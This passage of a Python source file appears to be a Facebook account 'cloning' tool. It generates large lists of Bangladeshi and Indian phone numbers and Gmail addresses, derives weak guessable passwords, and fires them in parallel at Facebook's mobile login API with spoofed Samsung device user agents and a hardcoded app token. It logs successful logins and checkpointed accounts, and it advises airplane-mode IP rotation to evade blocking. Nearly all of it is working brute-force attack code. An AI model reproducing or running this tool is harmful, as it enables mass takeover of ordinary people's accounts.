    print(" \x1b[38;5;208m[\033[38;5;46mB\x1b[38;5;208m] \033[2;97mUltra Speed Clone\x1b[0m")
    print(" \x1b[38;5;208m[\033[38;5;46mC\x1b[38;5;208m] \033[2;97m\x1b[38;5;208m\033[2;97mEmail-Female  \x1b[0m")
    print(" \x1b[38;5;208m[\033[38;5;46mD\x1b[38;5;208m] \033[2;97m\x1b[38;5;208m\033[2;97mEmail-Male \x1b[0m")
    print(" \x1b[38;5;208m[\033[38;5;46mE\x1b[38;5;208m] \033[2;97mAuto Cookies\x1b[0m")
    print(" \x1b[38;5;208m[\033[38;5;46mF\x1b[38;5;208m] \033[2;97mFile Clone\x1b[0m")
    print(" \x1b[38;5;208m[\033[38;5;46mG\x1b[38;5;208m] \033[2;97mInd Clone\x1b[0m")
    print(" \x1b[38;5;208m[\033[38;5;46mH\x1b[38;5;208m] \033[2;97mSeparate Ids\x1b[0m") 
    
      #dual("Welcome,Sir, I am GANJA A.I, YOUR TOOL VERSION IS 9.4, enjoy your best moment",'.audio.mp3')
    heron=input("\033[1;92m \x1b[38;5;208m[\033[38;5;196m>\x1b[38;5;208m]\x1b[0m\033[1;97m CHOOSE : \033[3;94m")
    if heron in ["a","A","1"]:
        mix()
    elif heron in ["b","B","2"]:
        ultra_speed()
    elif heron in ["c","C","3"]:
        femail()
    elif heron in ["d","D","4"]:
        email()
    elif heron in ["e","E","5"]:
        auto_coki()
    elif heron in ["f","F","6"]:
        file_iclone()
    elif heron in ["g","G","7"]:
        ind()
    elif heron in ["8","H","h"]:
        Separate()
    
    else:clear();print("Choose The Right option ");time.sleep(3.0);menu()
    menu()
domain="@gmail.com"

def Separate():
    clear()
    print(logo)
    try:
        print("\x1b[38;5;208m [•] Exemple : /sdcard/Heron.txt etc")
        line()
        fff=input(" Input File name:")
        line()
        file=open(fff,"r").read().splitlines()
    except:Separate()
    print(" [•] Example 100075, 100074, 100090 etc")
    line()
    data =str(input(" [<] choose:"))
    line()
    print(" Example /sdcard/save_file.txt")
    line()
    save=input(" Save location:")
    
    for ids in file:
        uid=ids.split("|")[0]
        if uid[0:6] in [data]:
            open(save,"a").write(ids+"\n")
        else: continue 
    line()
    print("\033[38;5;46m [✓] Successfully Separated")
    line()
    input (" Press Enter For Back To Menu")
#-----------------------femail
fefirst=rc(["sumaiya","fariya","mahi","jannat","sadia","samira","jannatul","riya","joya","anika","rimi","prama","sultana","neha","nadiya","mariya","israt","priya","pori","noha","nusrat","nadiya"])
def fgmail(user):
    last=["aktar","khan","islam","jahan","chowdhury","talukdar","khatun","rahman","official","gaming","roy","sarkar","das","mallik","queen"]
    top=["miss","angel","mst","dx","alex","rj","dj"]
    sur=["ritu","pori","prema","mawa","esha","ety","nuri","fariya","zara","popy","israt","sumaiya","jannat","joha","sopna","ruja","sultana","afrin","sharmin","jui","beli","joba","mim","eva","sadiya","mou","sumi","rimi","kakoli","saima","lima","fariya","nusrat","nila","adiba","nabila","ema","urfi","mahi","tabassum","riya","rita","borsa","kotha","nisi","sopna"]
    for i in range(unlimited):
        e1=f"{fefirst}{rc(last)}{rc(sur)}@gmail.com"
        e2=f"{fefirst}{rc(last)}{rc(sur)}{str(rn(1,100))}@gmail.com"
        e3=f"{fefirst}{rc(last)}{str(rn(1,100))}@gmail.com"
        e4=f"{fefirst}{rc(last)}@gmail.com"
        e5=f"{fefirst}{rc(sur)}@gmail.com"
        e6=f"{fefirst}{rc(sur)}{str(rn(1,100))}@gmail.com"
        e7=f"{rc(top)}{fefirst}{rc(last)}@gmail.com"
        e8=f"{rc(top)}{fefirst}{rc(last)}{str(rn(1,100))}@gmail.com"
        em=rc([e1,e2,e3,e4,e5,e6,e7,e8])
        if em in user:
            pass
        else:user.append(em)
        sys.stdout.write(f"\r \033[1;92mDUMPING EMAIL +\033[1;97m{len(user)}/10000      "),sys.stdout.flush()
        if len(user) ==10000:
            break

la=["chowdhury","khan","talukdar","rahaman","ahmed","hossain","islam","hasan","sarkar","sheikh","mulla","mondol"]
nmb=["123","1234","12345","official","71","99","404","143","420","rabbi","niloy","alom","nahid","ff","gaming","gamer","tohin","akash","rifat","sifat","joy","sagor","ovi","omar","samir","raj","rajib","jakir","ojit","faruk","mia","ridoy","mumit","labib","tutul","habib","abir","jihad","fahim","rahian","asad","nafi","nafis","siam","sir","limon","monir","himal","rudro","muhib","sadh","miya","sakil","jisan","milon","surjo","orko","jibon","arab","opu","onik","anik","emon","sami","saimon","antor","asif","abdul","rana","nurul","ismail","naim","ratul","sagor","hamim","roton","rony","safin","sajid","said","suhag","kasem","rasid","omit","drubo","yasin","abid","razu","sohid","wafi","khaled","mursed","suhel","torikul"]

f1=random.choice(["jihad","salman","pranto","muhammad","junaid","sabbir","raiyan","aminul","sajjad","rakibul","mahadi","ridoy","arafat","sadnam","sagor","rifat","faruk","mehedi","hasan","sakib","sohel","rakib","rafiq","rofiq","siam","saif","emon","emran","arif","rahian","ratul","kabbo","sadikul","rizbbi","rinku","somik","sudipto","mahin","muhit","mumin","rahat","nirob","shajit","rohan","rahul","bisal"])
def mail(user):
    dual("targeting emails",'.audio.mp3')
    for r in range(unlimited):
        e1=f"{f1}{rc(la)}{domain}"
        e2=f"{f1}{rc(nmb)}{domain}"
        e3=f"{f1}{str(rn(1000,9999))}{domain}"
        e4=f"{f1}{rc(la)}{str(rn(1,99))}{domain}"
        e5=f"{f1}{rc(nmb)}{str(rn(1,99))}{domain}"
        e6=f"{f1}{rc(la)}{rc(nmb)}{domain}"
        e10=f"md{f1}{rc(la)}{rc(nmb)}{domain}"
        e7=f"{f1}{rc(la)}{rc(nmb)}{str(rn(1,99))}{domain}"
        e8=f"{f1}{rc(la)}{rc(nmb)}{str(rn(100,999))}{domain}"
        e9=f"md{f1}{rc(la)}{rc(nmb)}{str(rn(100,999))}{domain}"
        emailG=rc([e1,e2,e3,e4,e5,e6,e7,e8,e9,e10])
        if emailG not in user:
            user.append(emailG)
            sys.stdout.write(f"\r \033[1;92mDUMPING EMAIL +\033[1;97m{len(user)}/10000      "),
            sys.stdout.flush()
        if len(user) ==10000:
            break
try:
    open(".install.txt","r").read()
except:
    _DEVIL_("pkg install play-audio -y")
    _DEVIL_("pkg install espeak -y")
    open(".install.txt","a").write("HERON")

def email():
    print("\x1b[0m")
    user=[]
    pr="EML"
    fb="auto"
    fb1="F7"
    clear()
    print(logo)
    mail(user)
    line()
    print("\033[1;97m [1] Mathod M     | [4] Mathod P   ")
    print(" [2] Mathod Mbasic| [5] Mathod X   ")
    print(f" [3] Mathod Free  | [6] Mathod Touch  ")
    line()
    gxd=input(" \033[1;97m[=_=] Choose :\033[1;91m\033[7;93m")
    if gxd in ["1","M"]:
        fb="m"
        fb1="F1"
    elif gxd in ["2","Mbasic"]:
        fb="mbasic"
        fb1="F2"
    elif gxd in ["3","Free"]:
        fb="free"
        fb1="F3"
    elif gxd in ["4","P"]:
        fb="p"
        fb1="F4"
    elif gxd in ["5","X"]:
        fb="x"
        fb1="F5"
    elif gxd in ["6","web"]:
        fb="touch"
        fb1="F6"
    elif gxd in ["Z","z"]:
        menu()
    else: pass
    with ThreadPool(max_workers=90) as __heron:
        tl=str(len(user))
        print("\x1b[0m")
        clear()
        n="123"
        print(logo)
        print(f"\033[3;97m  \033[2;97mTARGET-EMAIL: \x1b[0m\033[38;5;46m{f1+n+domain}   \x1b[0m")
        line()
        print("      \033[47m\033[1;94mUSE APN AND AIRPLANE MODE\x1b[0m")
        print("         \033[47m\033[2;90mB0B-MARLEY IS BACK\'\x1b[0m")
        line()
        pwx=[]
        pwx.append(f1+'12')
        pwx.append(f1+'123')
        pwx.append(f1+'1234')
        pwx.append(f1+'1122')
        pwx.append('123'+f1)
        pwx.append(f1+'@#')
        pwx.append(f1+'@@')
        pwx.append('@'+f1)
        pwx.append('@'+f1+'@')
        pwx.append(f1+'12345')
        pwx.append(f1+'##')
        for id in user:
            uid=id
            __heron.submit(programmer_heron,uid,pwx,tl,fb,pr,fb1)
    results()

def femail():
    print("\x1b[0m")
    user=[]
    pr="EML"
    fb="auto"
    fb1="F7"
    clear()
    print(logo)
    fgmail(user)
    line()
    print("\033[1;97m [1] Mathod M     | [4] Mathod P   ")
    print(" [2] Mathod Mbasic| [5] Mathod X   ")
    print(f" [3] Mathod Free  | [6] Mathod Touch  ")
    line()
    gxd=input(" \033[1;97m[=_=] Choose :\033[1;91m\033[7;93m")
    if gxd in ["1","M"]:
        fb="m"
        fb1="F1"
    elif gxd in ["2","Mbasic"]:
        fb="mbasic"
        fb1="F2"
    elif gxd in ["3","Free"]:
        fb="free"
        fb1="F3"
    elif gxd in ["4","P"]:
        fb="p"
        fb1="F4"
    elif gxd in ["5","X"]:
        fb="x"
        fb1="F5"
    elif gxd in ["6","web"]:
        fb="touch"
        fb1="F6"
    elif gxd in ["Z","z"]:
        menu()
    else: pass
    with ThreadPool(max_workers=90) as __heron:
        tl=str(len(user))
        print("\x1b[0m")
        clear()
        n="123"
        print(logo)
        print(f"\033[3;97m  \033[2;97mTARGET-EMAIL: \x1b[0m\033[38;5;46m{fefirst+n+domain}   \x1b[0m")
        line()
        print("      \033[47m\033[1;94mUSE APN AND AIRPLANE MODE\x1b[0m")
        print("         \033[47m\033[2;90mB0B-MARLEY IS BACK\'\x1b[0m")
        line()
        pwx=[]
        pwx.append(fefirst+'12')
        pwx.append(fefirst+'123')
        pwx.append(fefirst+'1234')
        pwx.append(fefirst+'12345')
        pwx.append("123"+fefirst)
        pwx.append(fefirst+'@#')
        pwx.append(fefirst+'@@')
        pwx.append("@"+fefirst)
        pwx.append(fefirst+"1122")
        pwx.append("@"+fefirst+"@")
        pwx.append(fefirst+"##")
        for id in user:
            uid=id
            __heron.submit(programmer_heron,uid,pwx,tl,fb,pr,fb1)
    results()

"""def block():
    bdata=requests.get("https://github.com/B0B-MARLEY/GANJA/blob/main/.block.txt").text
    open(".block.txt","w").write(bdata)
    if id in bdata:
        print(" \033[1;91mHEY MOTHER FUCKER🍁 YOU ARE BLOCKED") 
        removeer()
        sys.exit()"""


def mix():
    print("\x1b[0m")
    user=[]
    pr="MIX"
    fb="auto"
    fb1="F7"
    clear()
    print(logo)
    codeA=''.join(random.choice(string.digits) for _ in range(2))
    codeB=''.join(random.choice(string.digits) for _ in range(2))
    code=random.choice(["017","018","019"])
    print(f" \033[1;92m[\033[1;97m//\033[1;92m] YOUR NUMBER CODE IS (\033[1;97m{code}\033[1;92m)\x1b[0m")
    
    try:
        lim=int(input(f" [//] CHOOSE LIMIT [1-10000] :\033[3;93m"))
        
    except:
        lim=5000
    for yeron in range(unlimited):
        H340N=''.join(random.choice(string.digits) for _ in range(8))
        user.append(H340N)
        if len(user)==lim:
            break
    
    line()
    print("\033[1;97m [1] Mathod M     | [4] Mathod P   ")
    print(" [2] Mathod Mbasic| [5] Mathod X   ")
    print(f" [3] Mathod Free  | [6] Mathod Touch  ")
    line()
    
    gxd=input(" \033[1;97m[=_=] Choose :\033[1;91m\033[7;93m")
    if gxd in ["1","M"]:
        fb="m"
        fb1="F1"
    elif gxd in ["2","Mbasic"]:
        fb="mbasic"
        fb1="F2"
    elif gxd in ["3","Free"]:
        fb="free"
        fb1="F3"
    elif gxd in ["4","P"]:
        fb="p"
        fb1="F4"
    elif gxd in ["5","X"]:
        fb="x"
        fb1="F5"
    elif gxd in ["6","web"]:
        fb="touch"
        fb1="F6"
    elif gxd in ["Z","z"]:
        menu()
    else: pass
    
    with ThreadPool(max_workers=90) as __heron:
        print("\x1b[0m")
        clear()
        tl=str(len(user))
        print(logo)
        print(f"\033[3;97m  \033[2;97mC0DE: \x1b[0m\033[3;97m\033[38;5;46m{code}   \x1b[0m\033[1;97m[\x1b[0m\x1b[38;5;208m~\033[1;97m]\033[3;97m\033[2;97m LIMIT: \033[3;97m\x1b[0m\033[3;97m\033[38;5;46m{tl}\x1b[0m")
        line()
        print("      \033[47m\033[1;94mUSE APN AND AIRPLANE MODE\x1b[0m")
        print("         \033[47m\033[2;90mB0B-MARLEY IS BACK\'\x1b[0m")
        line()
        
        for xxx in user:
            uid=code+xxx
            pwx=[]
            pwx.append(uid[5:])#back 6
            pwx.append(uid[4:])#back 7
            pwx.append(uid[3:])#back 8
            pwx.append(uid[:6])#front 6
            pwx.append(uid[:7])#front 7
            pwx.append(uid[:8])#front 8
            pwx.append(uid)# 11
            
            pwx.append('@#@#@#')
            pwx.append('506070')
            pwx.append('708090')
            pwx.append('203040')
            __heron.submit(programmer_heron,uid,pwx,tl,fb,pr,fb1)
    results()

def ind():
    print("\x1b[0m")
    user=[]
    pr="MIX"
    fb="auto"
    fb1="F7"
    clear()
    print(logo)
    codeA=''.join(random.choice(string.digits) for _ in range(2))
    codeB=''.join(random.choice(string.digits) for _ in range(2))
    code=random.choice(["+91637"])
    print(f" \033[1;92m[\033[1;97m//\033[1;92m] YOUR NUMBER CODE IS (\033[1;97m{code+codeB}\033[1;92m)\x1b[0m")
    
    try:
        lim=int(input(f" [//] CHOOSE LIMIT [1-10000] :\033[3;93m"))
        
    except:
        lim=5000
    for yeron in range(unlimited):
        H340N=''.join(random.choice(string.digits) for _ in range(7))
        user.append(H340N)
        if len(user)==lim:
            break
    
    line()
    print("\033[1;97m [1] Mathod M     | [4] Mathod P   ")
    print(" [2] Mathod Mbasic| [5] Mathod X   ")
    print(f" [3] Mathod Free  | [6] Mathod Touch  ")
    line()
    
    gxd=input(" \033[1;97m[=_=] Choose :\033[1;91m\033[7;93m")
    if gxd in ["1","M"]:
        fb="m"
        fb1="F1"
    elif gxd in ["2","Mbasic"]:
        fb="mbasic"
        fb1="F2"
    elif gxd in ["3","Free"]:
        fb="free"
        fb1="F3"
    elif gxd in ["4","P"]:
        fb="p"
        fb1="F4"
    elif gxd in ["5","X"]:
        fb="x"
        fb1="F5"
    elif gxd in ["6","web"]:
        fb="touch"
        fb1="F6"
    elif gxd in ["Z","z"]:
        menu()
    else: pass
    
    with ThreadPool(max_workers=70) as __heron:
        print("\x1b[0m")
        clear()
        tl=str(len(user))
        print(logo)
        print(f"\033[3;97m  \033[2;97mC0DE: \x1b[0m\033[3;97m\033[38;5;46m{code+codeB}  \x1b[0m\033[1;97m[\x1b[0m\x1b[38;5;208m~\033[1;97m]\033[3;97m\033[2;97m LIMIT: \033[3;97m\x1b[0m\033[3;97m\033[38;5;46m{tl}\x1b[0m")
        line()
        print("      \033[47m\033[1;94mUSE APN AND AIRPLANE MODE\x1b[0m")
        print("         \033[47m\033[2;90mB0B-MARLEY IS BACK\'\x1b[0m")
        line()
        
        for xxx in user:
            uid=code+xxx
            pwx=[]
            pwx.append(xxx[1:])#back 6
            pwx.append(xxx)#back 7
            pwx.append("57273200")
            __heron.submit(programmer_heron,uid,pwx,tl,fb,pr,fb1)
    results()
    
def ultra_speed():
    print("\x1b[0m")
    user=[]
    pr="SPEED"
    fb="auto"
    fb1="F7"
    clear()
    print(logo)
    codeA=''.join(random.choice(string.digits) for _ in range(2))
    codeB=''.join(random.choice(string.digits) for _ in range(2))
    code=random.choice(["017","018","019","013","016"])
    print(f" \033[1;92m[\033[1;97m//\033[1;92m] YOUR NUMBER CODE IS (\033[1;97m{code+codeA+codeB}\033[1;92m)\x1b[0m")
    
    try:
        lim=100000
        
    except:
        lim=5000
    for yeron in range(unlimited):
        H340N=''.join(random.choice(string.digits) for _ in range(8))
        user.append(H340N)
        if len(user)==lim:
            break
    
    line()
    print("\033[1;97m [1] Mathod M     | [4] Mathod P   ")
    print(" [2] Mathod Mbasic| [5] Mathod X   ")
    print(f" [3] Mathod Free  | [6] Mathod Touch  ")
    line()
    
    gxd=input(" \033[1;97m[=_=] Choose :\033[1;91m\033[7;93m")
    if gxd in ["1","M"]:
        fb="m"
        fb1="F1"
    elif gxd in ["2","Mbasic"]:
        fb="mbasic"
        fb1="F2"
    elif gxd in ["3","Free"]:
        fb="free"
        fb1="F3"
    elif gxd in ["4","P"]:
        fb="p"
        fb1="F4"
    elif gxd in ["5","X"]:
        fb="x"
        fb1="F5"
    elif gxd in ["6","web"]:
        fb="touch"
        fb1="F6"
    elif gxd in ["Z","z"]:
        menu()
    else: pass
    
    with ThreadPool(max_workers=100) as __heron:
        print("\x1b[0m")
        clear()
        tl=str(len(user))
        print(logo)
        print(f"\033[3;97m  \033[2;97mC0DE: \x1b[0m\033[3;97m\033[38;5;46m{code+codeA+codeB}   \x1b[0m\033[1;97m[\x1b[0m\x1b[38;5;208m~\033[1;97m]\033[3;97m\033[2;97m LIMIT: \033[3;97m\x1b[0m\033[3;97m\033[38;5;46m{tl}\x1b[0m")
        line()
        print("      \033[47m\033[1;94mUSE APN AND AIRPLANE MODE\x1b[0m")
        print("         \033[47m\033[2;90mB0B-MARLEY IS BACK\'\x1b[0m")
        line()
        
        for xxx in user:
            uid=code+xxx
            pwx=[]
            pwx.append(uid[5:])
            pwx.append(uid)
            __heron.submit(programmer_heron,uid,pwx,tl,fb,pr,fb1)
    results()



ani=["\033[3;90m","",""]
emji=["🍪","🔰","💸","⭐","💟","🔷","🍁","🐼","🍘","🔶"]
prefax=["|","~","+","$","÷","•","-","!","✓","#","¢","√","=","*","&",":","_","@","×","%","?","<",">","^","©","®"]
mathod=["m","mbasic","p","x","free"]
#----------------------------------[✓] SUBMIT 
"""
def HOSTT(uid,pwx):
    global oks,loop
    session=requests.session()
    sys.stdout.write(f"\r\033[2;97m[B0B-XD] {loop}|{str(len(oks))}|{str(len(cps))}|F3\r");sys.stdout.flush()
    try:
        for ps in pwx:
            
            q=
            if "session_key" in q:
                print(f"\r\r\x1b[0m\033[38;5;46m[B0B-OK] {uid} <> {ps}\x1b[0m")
                oks.append(uid)
                break
            elif "www.facebook.com" in q:
                print(f"\r\r\033[2;97m[B0B-CP] {uid} <> {ps} \x1b[0m")
                cps.append(uid)
                break
            else: continue
        loop+=1
    except:time.sleep(5)
"""

def B_Api(uid,pwx):
    global oks,loop
    session=requests.session()
    sys.stdout.write(f"\r\033[2;97m[B0B-XD] {loop}|{str(len(oks))}|{str(len(cps))}|F2\r");sys.stdout.flush()
    try:
        for ps in pwx:
            xxxxx=['GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550   5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','GT-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890']
            fbks=['com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana','com.facebook.mlite']
            fbs=rc(fbks)
            application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
            application_version_code=str(random.randint(000000000,999999999))
            gtt=random.choice(xxxxx)
            gttt=random.choice(xxxxx)
            android_version=str(random.randrange(6,10))
            device_id = str(uuid.uuid4())
            adid = str(uuid.uuid4())
            ua_string = f'Davik/2.1.0 (Linux; U; Android {str(android_version)}.0.0; {str(gtt)} Build/{str(gttt)} [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=2.0,width=720,height=1280};'+f'FBLC/es_CU;FBRV/{str(application_version_code)};FBCR/Movistar;FBMF/samsung;FBBD/samsung;FBPN/{str(fbs)};FBDV/{str(gtt)};FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
            data = {'adid':adid,
            'email':uid,
            'password':ps,
            'cpl':'true',
            'credentials_type':'device_based_login_password',
            "source": "device_based_login",
            'error_detail_type':'button_with_disabled',
            'source':'login','format':'json',
            'generate_session_cookies':'1',
            'generate_analytics_claim':'1',
            'generate_machine_id':'1',
            "locale":"en_US",
            "client_country_code":"US",
            'device':gtt,
            'device_id':adid,
            "method": "auth.login",
            "fb_api_req_friendly_name": "authenticate",
            "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler"}
            head = {
            'content-type':'application/x-www-form-urlencoded',
            'x-fb-sim-hni':str(random.randint(2e4,4e4)),
            'x-fb-connection-type':'unknown',
            'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
            'user-agent':ua_string,
            'x-fb-net-hni':str(random.randint(2e4,4e4)),
            'x-fb-connection-bandwidth':str(random.randint(2e7,3e7)),
            'x-fb-connection-quality':'EXCELLENT',
            'x-fb-friendly-name':'authenticate',
            'accept-encoding':'gzip, deflate',
            'x-fb-http-engine':     'Liger'}
            url1= 'https://b-api.facebook.com/method/auth.login'
            po = session.post(url=url1,data=data,headers=head,allow_redirects=False).text
            q = json.loads(po)
            if "session_key" in q:
                print(f"\r\r\x1b[0m\033[38;5;46m[B0B-OK] {uid} <> {ps}\x1b[0m")
                oks.append(uid)
                break
            elif "www.facebook.com" in q["error_msg"]:
                print(f"\r\r\033[2;97m[B0B-CP] {uid} <> {ps} \x1b[0m")
                cps.append(uid)
                break
            else: continue
        loop+=1
    except:time.sleep(5)


def b_grap(uid,pwx):
    global oks,loop
    session=requests.session()
    sys.stdout.write(f"\r \033[1;97m[B0B-XD] {loop}|{str(len(oks))}|{str(len(cps))}|F1\r");sys.stdout.flush()
    try:
        for ps in pwx:
            xxxxx=['GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550   5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-